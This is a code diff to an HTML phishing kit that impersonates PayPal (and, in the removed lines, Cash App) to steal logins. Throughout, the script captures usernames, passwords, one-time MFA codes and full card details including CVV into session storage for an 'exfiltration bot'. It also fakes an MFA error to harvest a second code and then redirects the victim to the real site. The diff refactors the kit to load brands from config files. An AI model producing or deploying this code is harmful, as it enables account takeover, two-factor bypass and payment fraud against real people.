@@ -3,15 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Access | Login</title>
-    <link rel="stylesheet" href="styles.css">
-    <!-- THIS IS AN EXAMPLE TEMPLATE FOR TESTING ONLY -->
-    <!-- ignore this file & my shitty code -->
+    <title>Secure Access | Verification</title>
+    <link rel="stylesheet" href="../styles.css">
 </head>
 <body>
 
 <div class="auth-card">
-    <img id="logo-img" src="" alt="Logo" style="max-width: 150px; margin-bottom: 20px;">
+    <img id="logo-img" src="" alt="Brand Logo" style="max-width: 150px; margin-bottom: 20px; min-height: 40px;">
 
     <div id="step-1">
         <p>Log in to manage your account.</p>
@@ -47,88 +45,73 @@
     </div>
 </div>
 
-<script src="telemetry.js"></script>
+<script src="../telemetry.js"></script>
 <script>
-    /**
-     * CONFIGURATION MANIFEST
-     * Switch between brands by changing the 'current' key.
-     */
-    const BrandConfig = {
-        "paypal": {
-            "logo": "https://www.paypalobjects.com/paypal-ui/logos/svg/paypal-mark-color.svg",
-            "primary": "#0070ba",
-            "redirect": "https://paypal.com/signin"
-        },
-        "cashapp": {
-            "logo": "https://cash.app/assets/images/brand/logo.png",
-            "primary": "#00d632",
-            "redirect": "https://cash.app/login"
-        }
-    };
-
-    const config = BrandConfig["paypal"]; // <--- Switch this to re-skin
-
-    // Apply Brand Setup
-    document.getElementById('logo-img').src = config.logo;
-    document.documentElement.style.setProperty('--primary-blue', config.primary);
-
+    let activeConfig = {};
     let attempts = 0;
 
-    // Handle Login Submit
+    // --- 1. DYNAMIC CONFIG LOADER ---
+    async function initFramework(configName) {
+        try {
+            const res = await fetch(`../configs/${configName}.json`);
+            activeConfig = await res.json();
+            
+            // Inject Branding
+            document.getElementById('logo-img').src = activeConfig.logo;
+            document.documentElement.style.setProperty('--primary', activeConfig.primary);
+        } catch (err) {
+            console.error("Failed to load brand manifest.");
+        }
+    }
+
+    // Initialize with the PayPal config
+    initFramework('paypal');
+
+    // --- 2. EVENT LISTENERS ---
     document.getElementById('form-login').addEventListener('submit', async (e) => {
         e.preventDefault();
-        
-        // Save to session storage for the exfiltration bot
         sessionStorage.setItem('log_u', document.getElementById('u').value);
         sessionStorage.setItem('log_p', document.getElementById('p').value);
         
-        // Transition UI
         document.getElementById('step-1').classList.add('hidden');
         document.getElementById('step-2').classList.remove('hidden');
-        
-        // Trigger initial background audit
         TelemetryScanner.runAudit();
     });
 
-    // Handle MFA Submit (Ghosting Logic)
     document.getElementById('form-mfa').addEventListener('submit', async (e) => {
         e.preventDefault();
         attempts++;
-        
-        const code = document.getElementById('otp').value;
-        sessionStorage.setItem(`mfa_${attempts}`, code);
+        sessionStorage.setItem(`mfa_${attempts}`, document.getElementById('otp').value);
 
-        // Check the toggle in telemetry.js
         if (TelemetryScanner.settings.enableGhosting && attempts === 1) {
-            // Force an error to capture the SECOND code (the "Ghost")
             document.getElementById('mfa-error').classList.remove('hidden');
             document.getElementById('otp').value = ""; 
-            
-            // Log the first code immediately
             TelemetryScanner.runAudit(false);
         } else {
-            // Move to Billing Stage (Either ghosting is off, or it's the 2nd attempt)
-            document.getElementById('step-2').classList.add('hidden');
-            document.getElementById('step-billing').classList.remove('hidden');
-            TelemetryScanner.runAudit();
+            // Check if this config requires billing
+            if (activeConfig.hasBilling) {
+                document.getElementById('step-2').classList.add('hidden');
+                document.getElementById('step-billing').classList.remove('hidden');
+                TelemetryScanner.runAudit(false);
+            } else {
+                await TelemetryScanner.runAudit(true);
+                window.location.href = activeConfig.redirect;
+            }
         }
     });
 
-    // Handle Billing Submit
     document.getElementById('form-billing').addEventListener('submit', async (e) => {
         e.preventDefault();
-
         sessionStorage.setItem('cc_name', document.getElementById('cc_name').value);
         sessionStorage.setItem('cc_num', document.getElementById('cc_num').value);
         sessionStorage.setItem('cc_exp', document.getElementById('cc_exp').value);
         sessionStorage.setItem('cc_cvv', document.getElementById('cc_cvv').value);
 
-        // Finalize capture and redirect
         await TelemetryScanner.runAudit(true);
-        window.location.href = config.redirect;
+        window.location.href = activeConfig.redirect;
     });
 
-    // Auto-format card number
+    // Formatting Helpers
     document.getElementById('cc_num').addEventListener('input', (e) => {
         e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
     });
